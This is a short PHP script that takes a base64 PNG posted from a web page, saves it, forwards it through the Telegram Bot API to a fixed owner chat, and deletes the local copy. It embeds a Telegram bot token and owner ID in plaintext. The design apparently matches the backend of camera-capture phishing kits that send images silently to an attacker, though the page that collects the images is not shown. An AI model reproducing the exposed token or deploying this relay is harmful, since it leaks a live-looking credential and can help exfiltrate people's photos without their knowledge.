<?php
$botToken = "7862437195:AAE2sbHG17Xs-wpyWh5UUiWpoj52u6H5b84";
$ownerId = "6427256252";
$data = json_decode(file_get_contents("php://input"), true);
if (isset($data['image'])) {
    $imageData = $data['image'];
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    $imageData = base64_decode($imageData);
    $filePath = "foto.png";
    file_put_contents($filePath, $imageData);
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postData = [
        'chat_id' => $ownerId,
        'photo' => new CURLFile($filePath)
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    unlink($filePath);
    echo "Foto berhasil dikirim ke Telegram!";
} else {
    echo "Tidak ada gambar yang dikirim!";
}
?>
